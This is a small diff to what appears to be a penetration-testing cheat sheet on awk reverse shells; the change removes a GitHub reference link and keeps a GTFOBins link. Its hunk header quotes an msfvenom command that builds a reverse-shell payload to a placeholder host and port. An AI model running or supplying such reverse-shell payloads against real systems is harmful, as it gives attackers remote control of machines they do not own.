@@ -21,10 +21,6 @@ $ msfvenom -p cmd/unix/reverse_awk lhost=<IP> lport=<PORT>
 ---
 ## References
 
-### Github
-
-- [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)
-
 ### GTFOBins
 
 - [GTFOBins: Awk](https://gtfobins.github.io/gtfobins/awk/)
